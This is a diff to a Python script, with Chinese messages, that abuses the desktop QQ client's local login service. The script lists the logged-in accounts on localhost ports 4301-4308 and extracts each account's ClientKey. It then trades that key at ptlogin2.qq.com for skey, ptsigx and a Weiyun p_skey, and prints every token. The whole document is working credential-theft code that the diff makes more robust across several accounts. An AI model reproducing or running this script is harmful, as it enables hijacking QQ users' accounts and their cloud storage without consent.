@@ -19,14 +19,12 @@ def get_pt_local_token():
         status = res.status_code
         # print("[+] 获取 pt_local_token 中，响应码: ", status)
         if status == 200:
-            # print(res.headers.get("Set-Cookie").strip(' ').find("pt_local_token"))
             match_res = obj.search(res.headers.get("Set-Cookie"))
             PT_LOCAL_TOKEN = match_res.group("pt_local_token")
-            # print("[+] 获取到 pt_local_token:", PT_LOCAL_TOKEN)
-
         else:
             print("[-] 请求失败")
             exit(-1)
+
     except Exception:
         print("[-] 请先关闭代理")
         exit(-3)
@@ -42,9 +40,9 @@ def get_qq_uin():
         "Cookie": f"pt_local_token={PT_LOCAL_TOKEN};",
     }
     obj = re.compile(
-        r'"uin":(?P<uin>.*?),"face_index":(?P<face_index>.*?),"gender":(?P<gender>.*?),"nickname":"('
+        r'{"uin":(?P<uin>.*?),"face_index":(?P<face_index>.*?),"gender":(?P<gender>.*?),"nickname":"('
         r'?P<nickname>.*?)","client_type":(?P<client_type>.*?),"uin_flag":(?P<uin_flag>.*?),"account":('
-        r'?P<account>.*?)}]',
+        r'?P<account>.*?)}',
         re.S)
     account_num = 0
     for port in range(4301, 4309):
@@ -55,29 +53,37 @@ def get_qq_uin():
         try:
             res = requests.get(url=url, headers=headers)
             if res.status_code == 200:
-                account_num += 1
-                print(f"[+] 端口 {port} 访问成功")
+                print(f"[+] 端口 {port} 访问成功\n")
                 res_text = res.content.decode('utf-8')
-                match_res = obj.search(res_text)
-                QQ_ACCOUNT.update(
-                    {
-                        port:
-                            {
-                                "uin": match_res.group("uin"),
-                                "account": match_res.group("account"),
-                                "name": match_res.group("nickname"),
-                            }
-                    }
-                )
+                match_res = obj.findall(res_text)
 
-                print("[!] 账号:", QQ_ACCOUNT[port].get("account"))
-                print("[!] 用户名:", QQ_ACCOUNT[port].get("name"))
-                # print(res_text)
-                print("-------------------------------------------------")
+                for sub_matches in match_res:
+                    QQ_ACCOUNT.update(
+                        {
+                            account_num:
+                                {
+                                    "gender": '男' if sub_matches[2] == '1' else '女',
+                                    "account": sub_matches[6],
+                                    "name": sub_matches[3],
+                                    "uin": sub_matches[0],
+                                    "port": port,
+                                }
+                        }
+                    )
+
+                    print("[!] 账号:", QQ_ACCOUNT[account_num].get("account"))
+                    print("[!] 用户名:", QQ_ACCOUNT[account_num].get("name"))
+                    print("[!] 性别:", QQ_ACCOUNT[account_num].get("gender"))
+                    print()
+                    account_num += 1
+
+            else:
+                print(f"[-] 端口 {port} 访问失败")
 
         except Exception:
-            # print(f"[-] 端口 {port} 访问失败")
             break
+
+    print("-------------------------------------------------")
 
     if account_num == 0:
         print("[-] 请求失败，请先登录电脑QQ")
@@ -95,18 +101,22 @@ def get_qq_ClientKey():
         "Cookie": f"pt_local_token={PT_LOCAL_TOKEN};",
     }
     obj = re.compile(r"clientkey=(?P<clientkey>.*?);")
-    for port in range(4301, 4309):
+    for index in range(len(QQ_ACCOUNT)):
         try:
-            uin = QQ_ACCOUNT[port].get("uin")
+            uin = QQ_ACCOUNT[index].get("uin")
+            port = QQ_ACCOUNT[index].get("port")
             url = (f"https://localhost.ptlogin2.qq.com:{port}/pt_get_st?clientuin={uin}&callback=ptui_getst_CB"
                    f"&pt_local_tk={PT_LOCAL_TOKEN}")
             res = requests.get(url=url, headers=headers)
-            match_res = obj.search(res.headers.get("Set-Cookie"))
-            client_key = match_res.group("clientkey")
-            QQ_ACCOUNT[port]['client_key'] = client_key
-            # print(f"[!] ClientKey: ", client_key)
+            if res.status_code == 200:
+                match_res = obj.search(res.headers.get("Set-Cookie"))
+                client_key = match_res.group("clientkey")
+                QQ_ACCOUNT[index]['client_key'] = client_key
+            else:
+                QQ_ACCOUNT[index]['client_key'] = ''
 
         except Exception:
+            print(f'[-] 读取 {QQ_ACCOUNT[index].get("uin")} 信息错误')
             break
 
     pass
@@ -122,28 +132,30 @@ def get_skey():
     }
     obj = re.compile(r"skey=(?P<skey>.*?);")
     obj2 = re.compile(r"ptsigx=(?P<ptsigx>.*?)&")
-    for port in range(4301, 4309):
+    for index in range(len(QQ_ACCOUNT)):
         try:
-            uin = QQ_ACCOUNT[port]['uin']
-            client_key = QQ_ACCOUNT[port]['client_key']
+            uin = QQ_ACCOUNT[index]['uin']
+            client_key = QQ_ACCOUNT[index]['client_key']
             url = (f"https://ptlogin2.qq.com/jump?clientuin={uin}&clientkey={client_key}&keyindex=9&u1=https://www"
                    f".weiyun.com/web/callback/common_qq_login_ok.html?login_succ&pt_local_tk=&pt_3rd_aid=0&ptopt=1"
                    f"&style=40")
             res = requests.get(url=url, headers=headers)
-            match_res = obj.search(res.headers.get("set-Cookie"))
-            skey = match_res.group("skey")
-            QQ_ACCOUNT[port]['skey'] = skey
-            if res.content[16:17] == b'0':
-                print(f"[+] 账号 {QQ_ACCOUNT[port]['account']} 登录成功")
-                match_res = obj2.search(str(res.content))
-                ptsigx = match_res.group("ptsigx")
-                QQ_ACCOUNT[port]['ptsigx'] = ptsigx
-                print("[!] Skey: ", skey)
-                print("[!] ptsigx: ", ptsigx)
+            if res.status_code == 200:
+                match_res = obj.search(res.headers.get("set-Cookie"))
+                skey = match_res.group("skey")
+                QQ_ACCOUNT[index]['skey'] = skey
+                if res.content[16:17] == b'0':
+                    print(f"[+] 账号 {QQ_ACCOUNT[index]['account']} 登录成功")
+                    match_res = obj2.search(str(res.content))
+                    ptsigx = match_res.group("ptsigx")
+                    QQ_ACCOUNT[index]['ptsigx'] = ptsigx
+                else:
+                    QQ_ACCOUNT[index]['ptsigx'] = ''
+                    print(f"[-] {QQ_ACCOUNT[index]['account']} 登录失败")
             else:
-                print("[-] 登录失败")
+                QQ_ACCOUNT[index]['skey'] = ''
+                QQ_ACCOUNT[index]['ptsigx'] = ''
 
-            print("-------------------------------------------------")
         except Exception:
             break
     pass
@@ -157,22 +169,35 @@ def get_p_key():
         "Cookie": f"pt_local_token={PT_LOCAL_TOKEN};",
     }
     obj = re.compile(r"p_skey=(?P<p_skey>.*?);")
-    for port in range(4301, 4309):
+    for index in range(len(QQ_ACCOUNT)):
         try:
-            url = (f"https://ssl.ptlogin2.weiyun.com/check_sig?pttype=2&uin={QQ_ACCOUNT[port]['uin']}&service=jump&"
-                   f"nodirect=0&ptsigx={QQ_ACCOUNT[port]['ptsigx']}&s_url=https%3A%2F%2Fwww.weiyun.com%2Fweb%2Fcallback"
+            url = (f"https://ssl.ptlogin2.weiyun.com/check_sig?pttype=2&uin={QQ_ACCOUNT[index]['uin']}&service=jump&"
+                   f"nodirect=0&ptsigx={QQ_ACCOUNT[index]['ptsigx']}&s_url=https%3A%2F%2Fwww.weiyun.com%2Fweb%2Fcallback"
                    f"%2Fcommon_qq_login_ok.html%3Flogin_succ&f_url=&ptlang=2052&ptredirect=100&aid=1000101&daid=372&"
                    f"j_later=0&low_login_hour=0&regmaster=0&pt_login_type=2&pt_aid=0&pt_aaid=0&pt_light=0&pt_3rd_aid=0")
             res = requests.get(url=url, headers=headers, allow_redirects=False)
             match_res = obj.search(res.headers.get("Set-Cookie"))
             p_skey = match_res.group("p_skey")
-            QQ_ACCOUNT[port]["p_skey"] = p_skey
-            print("[!] p_skey: ", p_skey)
-            print("-------------------------------------------------")
+            QQ_ACCOUNT[index]["p_skey"] = p_skey
 
         except Exception:
+            QQ_ACCOUNT[index]["p_skey"] = ''
             break
         pass
+
+
+def show_information():
+    print("-------------------------------------------------")
+    for index in range(len(QQ_ACCOUNT)):
+        print("[!] 账号:", QQ_ACCOUNT[index].get("account"))
+        print("[!] 用户名:", QQ_ACCOUNT[index].get("name"))
+        print("[!] 性别:", QQ_ACCOUNT[index].get("gender"))
+        print("[!] ClientKey: ", QQ_ACCOUNT[index].get("client_key"))
+        print("[!] Skey: ", QQ_ACCOUNT[index].get("skey"))
+        print("[!] ptsigx: ", QQ_ACCOUNT[index].get("ptsigx"))
+        print("[!] p_skey: ", QQ_ACCOUNT[index]["p_skey"])
+        print("-------------------------------------------------")
+
 
 if __name__ == '__main__':
     get_pt_local_token()
@@ -180,4 +205,4 @@ if __name__ == '__main__':
     get_qq_ClientKey()
     get_skey()
     get_p_key()
-
+    show_information()
